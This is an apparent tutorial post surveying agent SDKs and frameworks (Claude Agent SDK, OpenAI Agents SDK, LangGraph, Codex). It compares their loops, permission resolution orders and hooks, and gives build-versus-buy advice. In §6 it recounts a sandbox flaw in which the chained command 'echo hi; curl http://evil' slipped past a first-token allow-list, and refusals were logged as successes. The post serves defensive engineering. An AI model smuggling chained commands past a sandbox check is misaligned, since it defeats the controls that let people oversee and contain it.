# 20 · The SDK & framework landscape — Agent SDK, LangGraph, and peers

> **TL;DR.** You rarely build a harness fully from scratch in production. An agent software development kit (SDK) is a **prebuilt harness**: it ships the loop, tools, context management, hooks and permissions of Parts I to III, plus the sub-agents of [Post 16](../16-multi-agent-orchestration/index.md) and some of the observability of [Post 21](../21-observability-traces/index.md), and you supply the custom layer. The practical skill is knowing what each option gives you and what it takes away, across batteries-included SDKs, graph frameworks, the open harness engines you can now embed, and rolling your own. This post surveys the landscape neutrally and gives a build-versus-buy rule you settle by measurement rather than by argument.
>
> **After reading this you will be able to:**
> - Name what each shape of harness product actually ships, in the eleven-component vocabulary of [Post 02](../02-anatomy-of-a-harness/index.md).
> - Compare a batteries-included SDK with a graph framework by the shape of the code.
> - Decide which shape you are in from an observable signal rather than from a preference.
> - Interrogate an SDK's defaults (exits, compaction, retries, permissions, traces) and settle the choice with an A/B on your own backlog.

![An illustrative feature matrix: six harness components against the Claude Agent SDK, the OpenAI Agents SDK, LangGraph, and rolling your own, with built-in, partial, and build-it-yourself marks; beneath it a strip of each option's own primitives, with the last column priced in lines instead, and two panels naming the row the matrix is missing and the cell it is harsh on.](diagrams/01-sdk-feature-matrix.svg)
*What each option gives you, as a sketch of the shape rather than a live spec sheet. §3 names the row it is missing.*

---

## 1. What an agent SDK provides

An agent software development kit (SDK) is the **prebuilt harness** of [Post 02](../02-anatomy-of-a-harness/index.md) §9. It ships the components this series spent Parts I to III building: the agent loop, tool dispatch, context management, hooks and a permission model. Most also ship two components from further along the map, the sub-agents of [Post 16](../16-multi-agent-orchestration/index.md) and some of the observability of [Post 21](../21-observability-traces/index.md). You do not write those; you inherit them.

What you still supply is the **custom layer**: your tools, your project's rules in a memory file, your enforcement hooks, your evals, and the task. One vendor states the split in almost these words. OpenAI's platform documentation for the Codex harness says the harness handles the agent loop, conversation state, streamed activity and tool interaction, while the embedding application owns its product context, business rules and tools, along with the interface and the operational boundaries (OpenAI, 2026). That is [Post 02](../02-anatomy-of-a-harness/index.md) §9's prebuilt-versus-custom seam, drawn by a provider on its own product page.

The load-bearing consequence is that an SDK does not remove harness engineering. It removes the *plumbing* of harness engineering and leaves you the part that is specific to your problem. "Just use an SDK" and "harness engineering is dead" are different claims, and only the first is true.

### The case that makes the point

OpenAI's own agent-first experiment is the clearest published example, and its numbers are worth carrying. A team started from an empty repository in late August 2025 and, five months later, had shipped a production beta of roughly one million lines of code across about 1,500 merged pull requests. Three engineers ran it at the start, seven by the end, averaging around 3.5 merged pull requests per engineer per day. Every line of it, from application logic to tests to continuous integration (CI) configuration, was written by Codex rather than by hand (OpenAI, 2026).

The harness was a constant throughout: the same prebuilt engine, from the same vendor, for five months. What the team engineered was the custom layer, and the most instructive detail is a failure. Their first attempt at a memory file was one large `AGENTS.md`, and it did not work, because a giant instruction file crowds out the task, the code and the relevant docs. The shape that worked was a roughly 100-line table of contents pointing into a structured `docs/` tree of design documents, execution plans, product specs and references (OpenAI, 2026). That is progressive disclosure applied to the memory file ([Post 10](../10-continual-learning-ratchet/index.md)), and no SDK shipped it. It was designed, measured against throughput, and rewritten, inside a prebuilt harness that never changed.

---

## 2. Four shapes, and the two axes that sort the rest

Four shapes cover most of the field, and this series names them without a protagonist:

- **A batteries-included agent SDK.** The Claude Agent SDK is the clearest example: it is the harness that powers Claude Code ([Post 01](../01-from-context-to-harness/index.md)), with the loop, tool use, the Model Context Protocol (MCP) runtime, hooks, permissions, sub-agents and context compaction built in. You supply tools and a goal; the loop is inside.
- **A provider's code-first agent framework.** The OpenAI Agents SDK is a small set of primitives you compose in ordinary Python: agents, handoffs, guardrails, sessions and built-in tracing (OpenAI, 2026). Nearer to a library than to an application.
- **A graph framework.** LangGraph models the agent as an explicit graph of nodes and edges, a state machine you assemble, with a persistence layer underneath it. It gives you more control over the control flow and asks you to draw the loop yourself.
- **An open harness engine you embed.** In August 2026 OpenAI published the Codex harness under the Apache-2.0 licence: the `codex` command-line interface, the non-interactive `codex exec` runner, the `app-server` engine behind persistent conversations and streamed events, and the Codex SDK for calling it from application code (OpenAI, 2026). The engine is the loop, the tool interaction, and the sandbox and approval policy; your application is the product around it.

Rolling your own is the fifth option and gets its own treatment in §6, because it is a decision about cost rather than a product on a shelf.

The field is much wider than four names. Google ships the Agent Development Kit; Microsoft's Agent Framework unified the AutoGen and Semantic Kernel lineages in 2026; Pydantic AI, smolagents and CrewAI each occupy their own corner. Reviewing them would date this post within a quarter, so two axes are more useful than a list: **how much of the loop the framework owns**, and **whether it is tied to one provider's models**. Place any framework on those two axes and you know most of what matters about it before reading a line of its documentation. The Reference Implementations section of *awesome-harness-engineering* is the living list this paragraph deliberately is not.

The sibling series covered several of these same hosts from the token side, asking what a memory file, a skill and a tool schema cost inside the window (Context Engineering, Post 26). This post asks what the same hosts ship as runtime machinery. The two views are complementary, and neither is a substitute for the other.

---

## 3. What each one actually ships

Naming products teaches nothing. Naming their primitives, and saying which box on the map each one fills, teaches the map. Read this table as a translation dictionary rather than a scorecard.

| Shape (example) | Its own vocabulary | Where each lands on the map |
|---|---|---|
| **Batteries-included SDK** (Claude Agent SDK) | hooks on lifecycle events (`PreToolUse`, `PostToolUse`, `PreCompact`); permission modes (`default`, `acceptEdits`, `plan`, `bypassPermissions`); MCP servers; sub-agents; automatic compaction | hooks ([Post 13](../13-hooks-enforcement/index.md)); permissions ([Post 14](../14-permissions-sandboxes/index.md), [Post 15](../15-human-in-the-loop/index.md)); tools and MCP ([Post 07](../07-skills-mcp-runtime/index.md)); orchestration ([Post 16](../16-multi-agent-orchestration/index.md)); context management ([Post 09](../09-context-management-loop/index.md)) |
| **Code-first framework** (OpenAI Agents SDK) | agents; handoffs; guardrails, which run input and output checks in parallel with the turn; sessions; built-in tracing | sub-agents ([Post 16](../16-multi-agent-orchestration/index.md)); enforcement ([Post 13](../13-hooks-enforcement/index.md)); context management ([Post 09](../09-context-management-loop/index.md)); observability ([Post 21](../21-observability-traces/index.md)) |
| **Graph framework** (LangGraph) | a typed state graph of nodes and edges; checkpointers that persist state at every step; `interrupt()` and resume; time travel across saved checkpoints | the loop, drawn by you ([Post 03](../03-the-agent-loop/index.md)); durable state ([Post 08](../08-state-filesystem-git/index.md)); approval gates ([Post 15](../15-human-in-the-loop/index.md)); replay ([Post 21](../21-observability-traces/index.md) §7) |
| **Open harness engine** (Codex, Apache-2.0) | `codex exec`; the `app-server` engine; the Codex SDK; sandbox and approval policy inside the engine | the loop ([Post 03](../03-the-agent-loop/index.md)); sandboxes ([Post 14](../14-permissions-sandboxes/index.md)); approvals ([Post 15](../15-human-in-the-loop/index.md)) |

The instructive column is the one the table cannot show: what each shape does *not* give you.

- A batteries-included SDK does not give you explicit control flow. You cannot express a branch its loop does not already make, and that is the price of the loop being free.
- A code-first framework hands you agents and delegation but not verification ([Post 11](../11-verification-loops/index.md)). Its stop conditions are the framework's, not yours.
- A graph framework gives you no compaction policy, no permission model and no sandbox. What it gives you is the machinery to express a loop; you still draw the loop.
- An open engine does not include model access or the vendor's hosted services. The engine is yours to fork; the tokens are not.

The hero matrix at the top has a blind spot worth naming, since a survey that flatters one column is a scorecard. It has no row for **durable state and resumability**, which is the single axis where a graph framework clearly beats a batteries-included SDK: a checkpointer makes every step of a run recoverable, so a process restart resumes rather than starts over (LangChain, 2025–26). Its "hooks and permissions" cell for LangGraph is also harsh, because `interrupt()` is a first-class approval primitive, which is precisely the mechanism of [Post 15](../15-human-in-the-loop/index.md). Read the matrix as a sketch of the shape of the field, then read this section for the corrections.

---

## 4. The shape of the code

The difference between shapes is visible in about a dozen lines. The block below is illustrative, shaped after the real interfaces rather than copied from them:

```python
# A · A batteries-included SDK owns the loop; you supply tools and a goal.
agent = AgentSDK(tools=[bash, read_file], system=SYSTEM, hooks=[deny_list])
result = agent.run("add a test for the parser and make it pass")

# B · A graph framework: you draw the loop as nodes and edges.
graph = StateGraph(State)
graph.add_node("reason", call_model)
graph.add_node("act", run_tools)
graph.add_edge("reason", "act")
graph.add_conditional_edges("act", lambda s: END if s["done"] else "reason")
app = graph.compile(checkpointer=saver)
result = app.invoke({"task": "add a test for the parser and make it pass"},
                    config={"configurable": {"thread_id": "run-1"}})
```

Both run the same task. The SDK hides the loop and hands you a `run`; the graph framework hands you the loop to wire. The two lines that carry the real argument are the last two of block B: the checkpointer passed at compile time and the thread identifier passed at invoke time are what make the run resumable, inspectable and forkable. That is the capability you bought with the extra eight lines, and if you do not need it, those eight lines are pure cost.

Neither shape is better in the abstract. A plain reason-act-observe loop expressed as a graph is a state machine with two states, which is a diagram of a `while` loop rather than an improvement on one.

---

## 5. What an SDK takes away

"Know what it takes away" is easy advice and useless without a list. Seven things are worth checking before adopting one, because each is a decision this series taught you to make deliberately, and an SDK has already made it for you:

- **The stop conditions.** [Post 19](../19-loop-engineering/index.md) §2 argued for four layered exits with a budget checked *before* the call that would breach it. Ask which exits the SDK implements, whether the budget ceiling is enforced or advisory, and whether a guard exit leaves you a resumable position or just raises.
- **The context-management policy.** When does it compact, what does it drop, and can you see what it dropped? An SDK that silently summarises the middle of your run has made a [Post 09](../09-context-management-loop/index.md) §5 decision on your behalf, and a summary that discarded the wrong thing looks exactly like a model that forgot.
- **Error and retry semantics.** Does a failing tool return an observation the model can reason about, or raise into your process? [Post 06](../06-tools-bash-code/index.md) §8 sets the standard for the return value: surface the exit status, and never return an empty string. Its §7 puts the rule beneath both, that a tool must never crash the loop at all. Then ask whether the SDK's own retries count against your token budget.
- **The permission granularity.** Per tool, or per call with arguments? [Post 15](../15-human-in-the-loop/index.md) §3 recommends starting at tool granularity and narrowing to argument granularity for exactly the tools where the coarse version fires on things nobody needs to see, and its section 10 works the arithmetic that shows why: narrowing one policy took a gate from 34 requests per run to 3, which is the difference between reviewers who read the requests and reviewers who rubber-stamp them.
- **The hook lifecycle.** Which events can a hook observe, and which of them can actually *stop* a call? [Post 13](../13-hooks-enforcement/index.md) §2 is the test: a hook that can only comment after the fact is a report, not a gate, and only a pre-tool point can enforce.
- **The trace format.** Whether a gate's refusal is distinguishable from a success ([Post 14](../14-permissions-sandboxes/index.md) §5) is a property of the SDK's instrumentation, not something you can add afterwards. [Post 21](../21-observability-traces/index.md) §2 lists what a usable span carries: the stop reason on the run, token counts per model call, and sub-agent work nested rather than flattened.
- **The upgrade cadence.** A fast-moving SDK is a dependency that changes under you. That is often worth it, and it is a maintenance cost that belongs in the build-versus-buy sum rather than outside it.

### One question, worked

A checklist teaches you what to ask but not what an answer looks like. Take the permission question against a real SDK. The Claude Agent SDK resolves every tool-use request in a fixed six-step order: hooks first, then deny rules, then ask rules, then the active permission mode, then allow rules, and only then the `canUseTool` callback (Anthropic, 2026). The answer to "per tool, or per call with arguments?" is therefore *both*, and the part you actually have to learn is the precedence.

Two consequences fall straight out of the order. A deny rule sitting *ahead* of the mode check is what makes an aggressive mode survivable: `bypassPermissions` approves what reaches it, and a scoped deny rule never lets a match reach it. And the callback sitting *last* is the argument-level granularity of [Post 15](../15-human-in-the-loop/index.md) §3, which also means anything auto-approved by an earlier step never arrives there. A permission check written only in that callback is silently skipped for every pre-approved tool, which is a defect that produces no error message at all.

The transferable lesson is the artefact to go looking for. For every SDK you evaluate, find the documented **resolution order**. An SDK that does not publish one has still made the decision; it has just made it somewhere you cannot read.

---

## 6. Which shape are you in

The default is an SDK, and rolling your own is a choice you earn.

![A build-versus-buy tree: targeting one model's ecosystem leads to its native SDK; needing unusual control leads to a graph framework or rolling your own; otherwise a batteries-included SDK. Beside it, the build priced from this series' own two companions; below it, a table replacing each branch with a signal you can observe today and what that shape costs.](diagrams/02-build-vs-buy.svg)
*Default to an SDK; earn your way to rolling your own.*

A tree branches on questions, and questions like "do you need unusual control flow?" are answered by preference unless you can point at something. The table below replaces each branch with an observable signal, so the answer is a statement about your system rather than about your taste.

| The signal you can observe today | The shape it points at | What it costs you |
|---|---|---|
| One model in production, no concrete plan to switch | that model's native SDK | portability, and a rewrite if the plan changes |
| Branch logic you have already written that the SDK's loop keeps fighting, or runs that must survive a process restart | a graph framework | the batteries: compaction, permissions, sandboxing are now yours |
| You need the vendor's loop and sandbox but your own product surface around it | an open harness engine you embed | the integration work, and the model access is still rented |
| You cannot name the SDK feature you would be giving up | a batteries-included SDK, not a build | nothing; this is the cheap answer |
| A requirement no shipped harness expresses, which you can state in one sentence | roll your own | everything in the sum below, plus its maintenance |

The last two rows are the useful ones. "I cannot name what I would be giving up" is a testable statement about the reader rather than a claim about the tools, and it is the most common true answer.

**Use the model's native SDK** when you are committed to one model's ecosystem. The co-training flywheel ([Post 04](../04-harness-beats-model/index.md)) means a model performs best inside the harness it was shaped with, so a generic wrapper leaves capability on the table.

### Price the build before you choose it

This series builds two harnesses from scratch, so the cost of the "roll your own" row can be quoted rather than estimated. Build #1 ([Post 24](../24-build-minimal-harness/index.md), companion [`code/24-minimal-harness/`](../../code/24-minimal-harness/)) is **520 lines of implementation and 138 of tests**, a 10-test suite, and it buys a loop, a schema-validated tool registry, a verification gate and four layered exits. Build #2 ([Post 25](../25-build-harness-plus/index.md), companion [`code/25-harness-plus/`](../../code/25-harness-plus/)) layers hooks, a sandbox, an approval gate, a sub-agent and tracing on top, and comes to **728 implementation lines and 233 test lines** across a 13-test suite.

The two figures do not simply add, because each build carries its own loop and tool registry, and Build #2 ships no verifier at all ([Post 25](../25-build-harness-plus/index.md), section 11). Take the union instead and the honest figure for rolling your own is not a 500-line engine: it is roughly **800 implementation lines**, plus another 250 or so of tests, to reach the feature set of a mid-range SDK. And that total still has no compaction policy, no retry semantics, no MCP client, and no permission resolution order. Add those and you are past 1,500 lines of code whose only purpose is to be the same as everybody else's, maintained by you, forever.

The maintenance is not the worst of it. Both of this series' companions shipped with defects their own passing test suites could not see. One sandbox checked the first token of a command and then executed the raw string through a shell, so `echo hi; curl http://evil` passed: `echo` was allow-listed and the shell ran the rest anyway. The same build tagged trace spans `blocked`, `denied` or `ok`, and because a sandbox refuses *inside* the tool and returns an ordinary string, every sandbox refusal landed in `ok`, indistinguishable from a command that ran. Both are dissected in [Post 25](../25-build-harness-plus/index.md), section 10, and the second again in [Post 14](../14-permissions-sandboxes/index.md) §5. That is the strongest argument against rolling your own that this series can make about itself: the cost includes the bugs that an SDK's other users have already found for you.

Build from scratch to *understand* what the SDKs do, which is exactly what Posts 24 to 26 are for. Building a harness once is the fastest way to see what a prebuilt one is doing. That is a reason to read those three posts, not a reason to ship what they build.

---

## 7. Settle it by measuring, not by arguing

The comparison in §3 is a sketch, and sketches lose to evidence. The whole premise of this series is that the harness is a variable that moves outcomes ([Post 04](../04-harness-beats-model/index.md)), which means *the choice between two harnesses is an empirical question you can settle*.

The method is harness A/B ([Post 22](../22-evaluating-harnesses/index.md) §7): hold the model and the task set fixed, swap the harness, and compare on the numbers that matter. Two of the four are Post 22's own vocabulary, because they are what an eval harness actually produces: **resolved-rate** and **cost per resolved task**. The other two, wall-clock and human interventions per run, are operational numbers only your own instrumentation will report.

![An experiment layout: the model and a twenty-job task set held fixed on the left, harness A and harness B as the only varied thing in the middle, and four measured numbers on the right. A full-width panel below works through whether the seven-point gap is real, and two caution panels sit under that.](diagrams/03-harness-ab.svg)
*One thing varies. Everything else is held still, which is the only reason the four numbers mean anything — and the panel below is why seven points across twenty tasks is not yet a decision.*

One pass per task is not a result. Agent runs are draws from a stochastic process, so each task runs several times and the comparable number is resolved-rate as a mean over seeds with its spread, not a single lucky pass ([Post 22](../22-evaluating-harnesses/index.md) §4).

### A worked comparison

Take twenty representative jobs from your own backlog, five seeds each: 100 runs per arm, 200 runs in total. Suppose harness A resolves 61 of its 100 runs and harness B resolves 68, at an average of $0.42 and $0.61 per run.

- **Resolved-rate:** 61% against 68%, a 7-point gap.
- **Cost per resolved task:** $42 / 61 = **$0.69** for A; $61 / 68 = **$0.90** for B. B resolves more and costs about 30% more for each thing it resolves.
- **Is the 7 points real?** Treating the 100 runs as independent draws, the standard error near a 65% rate is about 4.8 points, so a 7-point gap is roughly 1.5 standard errors: suggestive, not settled. And those runs are *not* independent, because five of them share a task; the honest denominator is nearer the 20 tasks than the 100 runs, where the standard error is about 11 points. Twenty tasks reliably detect a large effect. They do not adjudicate seven points. Pairing the two arms task by task is what strips out the task-difficulty variance that swamps that interval ([Post 22](../22-evaluating-harnesses/index.md) §8).
- **The per-task diff:** suppose B fixed nine tasks and broke two. That is the row that decides it, and it is invisible in the aggregate ([Post 22](../22-evaluating-harnesses/index.md) §7).

The arithmetic is worth doing before the migration, not after, because it converts "B feels better" into "B costs 30% more per resolved task and regressed two jobs we care about". A fixed task set from your own backlog will still tell you more in a day than any feature matrix, including the one at the top of this post.

Two cautions travel with any such comparison. Judging a model outside its native SDK understates it, because of the co-training flywheel, so an A/B across SDKs is partly measuring the model-harness pairing rather than the harness alone. And migration cost is usually dominated not by the loop but by how deeply your custom layer reached into the SDK's types, which is a cost you control at design time rather than at migration time.

---

## 8. Portability and lock-in

Every SDK ties you to its abstractions, and the tie is worth pricing before you commit. An SDK's loop, its hook API and its permission model are its own; migrating off them is real work. The cheapest way to see how much work is to look at what survives a move untouched.

A tool is a function plus a schema, and both of those are yours. Only the adapter belongs to the harness:

```python
# The portable half: a plain function and the schema that describes it.
def read_file(args: dict) -> str:
    return open(args["path"], encoding="utf-8").read()

READ_FILE = {
    "name": "read_file",
    "description": "Read a UTF-8 text file and return its contents.",
    "input_schema": {"type": "object",
                     "properties": {"path": {"type": "string"}},
                     "required": ["path"], "additionalProperties": False},
}

# Adapter A · a harness that takes a tool list and runs the loop itself.
registry = ToolRegistry([Tool(READ_FILE["name"], READ_FILE["description"],
                              READ_FILE["input_schema"], read_file)])

# Adapter B · a graph framework: the same function becomes one node.
def read_file_node(state: dict) -> dict:
    return {**state, "observation": read_file(state["args"])}
```

`Tool` and `ToolRegistry` here are the real types from [`code/24-minimal-harness/`](../../code/24-minimal-harness/); every provider SDK has an equivalent pair. The point is what did not move. The function is unchanged, the schema is unchanged, and the switching cost for this tool is the three lines under each adapter comment. **The length of the adapter is the switching cost**, which makes it a quantity you can design down rather than a risk you can only worry about.

Two things reduce lock-in, and both follow from that observation:

- **Plain tools and MCP.** A tool defined as a function ports at the cost of its adapter. A capability behind an MCP server ports for free, because the specification puts a process boundary between host, client and server, so any compliant host can call the same server unchanged ([Post 07](../07-skills-mcp-runtime/index.md) §8).
- **Keeping the custom layer separable.** Your memory file, your evals and your task definitions are yours; the more they live outside the SDK's types, the cheaper a switch is. A hook written as a plain predicate over a tool name and its arguments ports; the same logic written against the SDK's hook input object does not.

An open engine prices lock-in differently again. A harness published under a permissive licence gives you a fallback a proprietary SDK cannot: if the vendor's direction stops matching yours, forking is available where migrating was the only option. That is a genuine change in the shape of the risk and it is not the same as having no risk, because model access and the hosted services are not part of the open release. The dependency does not disappear; it moves from the engine to the tokens.

The trade is the usual one. A native SDK buys co-trained performance at the cost of portability; a graph framework buys explicit control at the cost of the batteries; an open engine buys the right to fork at the cost of integration work; a from-scratch harness buys total control at the price computed in §6. There is no free option, only a priced one.

---

## 9. Harness-as-a-Service, and the layer beside MCP

The landscape is trending toward a further step: from an SDK you run to a **service you call**. The shift is from large language model (LLM) application programming interfaces (APIs) that return a completion to *harness APIs* that return a runtime, with the loop, tools, context management and hooks already inside (Osmani, 2026). You send a task and get back an agent run, not a token stream.

Harness-as-a-Service is the commercial endpoint of everything in this series: the harness, packaged and sold as the unit. It moves the whole ledger of §6 across to the other side, since a rented runtime has no line count and no maintenance, and a per-run price instead. Whether to build, buy an SDK, or rent a runtime is then partly an economics question, which is [Post 23](../23-economics-haas/index.md).

A second shift is running *beside* MCP rather than above it. A2A (Agent2Agent) is an open protocol for agents built by different vendors to discover one another, exchange messages and coordinate tasks; agents advertise their capabilities through **agent cards** served over HTTP and JSON, so one agent can call another without sharing its internal state (A2A Project, 2025–26). The relationship to MCP is horizontal against vertical: MCP connects one agent *down* to its tools and data, and A2A connects agents *sideways* to each other. It is a governed specification rather than a rumour: Google transferred the protocol, its specification and its SDKs to the Linux Foundation in June 2025 for vendor-neutral governance (Linux Foundation, 2025). Multi-agent systems that cross an organisational boundary sit beyond this series' single-agent-and-orchestration scope, but this is the interoperability layer to watch as agent fleets begin to transact directly.

---

## Common pitfalls

- **Rolling your own by default.** An SDK is usually the right call; build from scratch to learn, not as a production reflex. Price it first: roughly 800 implementation lines for a mid-range feature set, before compaction, retries or MCP (§6).
- **Thinking an SDK removes harness engineering.** It removes the plumbing; you still design the custom layer, and OpenAI's own agent-first team spent five months doing exactly that inside an unchanging harness (§1).
- **Judging a model outside its native SDK.** A generic wrapper understates a frontier model, because of the co-training flywheel (§7; Post 04).
- **Deep lock-in without pricing it.** The switching cost is the length of your adapters and the depth your custom layer reached into the SDK's types. Both are design-time choices (§8).
- **Treating an open engine as zero lock-in.** A permissive licence gives you the right to fork the engine. It does not give you the model, and the hosted services are not in the release (§8).
- **Adopting without auditing the defaults.** The SDK has already chosen your stop conditions, compaction policy, retry semantics, hook lifecycle and permission resolution order. Go and read the order; every one of them has one (§5).
- **Choosing an SDK from a feature matrix.** Hold the model and task set fixed and A/B the harnesses on your own backlog, several seeds per task, and read the per-task diff as well as the mean (§7; Post 22).
- **A graph framework for a simple loop.** Explicit graphs earn their extra lines through durable state and resumability. A plain reason-act-observe loop drawn as a graph is a two-state machine (§4).
- **Silent compaction you never inspect.** An SDK that summarises the middle of a run has made a context decision for you, and a bad summary is indistinguishable from a model that forgot (§5; Post 09).

---

## Further reading

- Anthropic, "Claude Agent SDK" documentation (2025–26): the loop, tools, MCP, hooks, permissions and sub-agents as a prebuilt harness.
- Anthropic, "Configure permissions" (Claude Agent SDK documentation, 2026): the six-step resolution order worked through in §5, the permission modes, and why a deny rule holds under `bypassPermissions`.
- OpenAI, "Harness engineering: leveraging Codex in an agent-first world" (2026): the five-month agent-first experiment, its figures, and the `AGENTS.md` table-of-contents shape.
- OpenAI, "Codex as a platform: build on the open agent harness" (2026), with the Apache-2.0 `openai/codex` repository: the harness-versus-application split in a vendor's own words, and the engine you can embed.
- OpenAI Agents SDK documentation (2025–26): agents, handoffs, guardrails, sessions and built-in tracing.
- LangGraph documentation (LangChain, 2025–26): graph-based control flow, checkpointers, durable execution, `interrupt()` and time travel.
- A2A Project, "Agent2Agent (A2A) protocol specification" (2025–26): agent cards, discovery and messaging between agents; under Linux Foundation governance since June 2025.
- Osmani, "Agent Harness Engineering" (2026): the Harness-as-a-Service framing used in §9.
- awesome-harness-engineering (2026): the Reference Implementations section, the living list §2 declines to be.

Full citations are in [REFERENCES.md](../../REFERENCES.md).

---

## What to read next

- **[Post 21 — Observability & trace-driven repair](../21-observability-traces/index.md)**: Part V opens with seeing what a harness, SDK or not, actually did.
- **[Post 22 — Evaluating harnesses](../22-evaluating-harnesses/index.md)**: the A/B method of §7, in full, with the eval harness that produces the numbers.
- **[Post 24 — Build #1: a minimal agent harness](../24-build-minimal-harness/index.md)**: rolling your own, to understand what the SDKs provide.
- **[Post 02 — The anatomy of a harness](../02-anatomy-of-a-harness/index.md)**: the prebuilt-versus-custom split an SDK sits on.
